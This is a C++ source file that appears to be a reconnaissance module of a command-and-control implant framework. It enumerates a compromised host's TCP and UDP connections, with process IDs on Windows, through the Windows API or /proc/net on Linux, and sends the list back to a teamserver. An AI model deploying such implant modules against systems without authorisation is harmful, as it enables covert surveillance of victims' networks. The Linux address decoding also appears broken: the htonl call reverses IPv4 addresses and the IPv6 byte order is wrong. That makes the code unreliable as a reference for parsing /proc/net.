#include "Netstat.hpp"
#include "Common.hpp"

#include <cstring>
#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#else
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fstream>
#include <sstream>
#include <cstdlib>
#endif

using namespace std;

constexpr std::string_view moduleName = "netstat";
constexpr unsigned long long moduleHash = djb2(moduleName);

#ifdef _WIN32
__declspec(dllexport) Netstat* NetstatConstructor()
{
    return new Netstat();
}
#else
__attribute__((visibility("default"))) Netstat* NetstatConstructor()
{
    return new Netstat();
}
#endif

Netstat::Netstat()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}

Netstat::~Netstat()
{
}

std::string Netstat::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "netstat:\n";
    info += "Show active network connections.\n";
#endif
    return info;
}

int Netstat::init(std::vector<std::string>& splitedCmd, C2Message& c2Message)
{
    c2Message.set_instruction(splitedCmd[0]);
    return 0;
}

int Netstat::process(C2Message& c2Message, C2Message& c2RetMessage)
{
    std::string out = runNetstat();
    c2RetMessage.set_instruction(c2Message.instruction());
    c2RetMessage.set_returnvalue(out);
    return 0;
}

std::string Netstat::runNetstat()
{
#ifdef _WIN32
    std::string result;
    DWORD size = 0;
    GetExtendedTcpTable(nullptr, &size, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
    std::vector<char> buf(size);
    if(GetExtendedTcpTable(buf.data(), &size, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) == NO_ERROR)
    {
        auto table = reinterpret_cast<PMIB_TCPTABLE_OWNER_PID>(buf.data());
        for(DWORD i=0; i<table->dwNumEntries; ++i)
        {
            char local[INET_ADDRSTRLEN];
            char remote[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &table->table[i].dwLocalAddr, local, sizeof(local));
            inet_ntop(AF_INET, &table->table[i].dwRemoteAddr, remote, sizeof(remote));
            result += "TCP ";
            result += local; result += ':'; result += std::to_string(ntohs((u_short)table->table[i].dwLocalPort));
            result += " -> ";
            result += remote; result += ':'; result += std::to_string(ntohs((u_short)table->table[i].dwRemotePort));
            result += " State:"; result += std::to_string(table->table[i].dwState);
            result += " PID:"; result += std::to_string(table->table[i].dwOwningPid);
            result += "\n";
        }
    }
    return result;
#else
    std::string result;
    auto parse = [&](const std::string& path, const char* proto, bool ipv6)
    {
        std::ifstream f(path);
        if(!f) return;
        std::string line;
        std::getline(f, line); // skip header
        while(std::getline(f, line))
        {
            std::istringstream iss(line);
            std::string sl, local, remote, st;
            iss >> sl >> local >> remote >> st;
            auto decodeAddr = [&](const std::string& in)->std::string
            {
                size_t pos = in.find(':');
                std::string iphex = in.substr(0,pos);
                std::string porthex = in.substr(pos+1);
                unsigned port = std::stoul(porthex, nullptr, 16);
                char buf[INET6_ADDRSTRLEN];
                if(ipv6)
                {
                    struct in6_addr a{};
                    for(int i=0;i<16;i++)
                        a.s6_addr[15-i] = std::stoi(iphex.substr(i*2,2),nullptr,16);
                    inet_ntop(AF_INET6, &a, buf, sizeof(buf));
                }
                else
                {
                    struct in_addr a{};
                    a.s_addr = htonl(std::stoul(iphex, nullptr, 16));
                    inet_ntop(AF_INET, &a, buf, sizeof(buf));
                }
                return std::string(buf)+":"+std::to_string(port);
            };
            result += proto; result += " ";
            result += decodeAddr(local); result += " -> ";
            result += decodeAddr(remote); result += " State:"; result += st;
            result += "\n";
        }
    };
    parse("/proc/net/tcp", "TCP", false);
    parse("/proc/net/udp", "UDP", false);
    parse("/proc/net/tcp6", "TCP6", true);
    parse("/proc/net/udp6", "UDP6", true);
    return result;
#endif
}

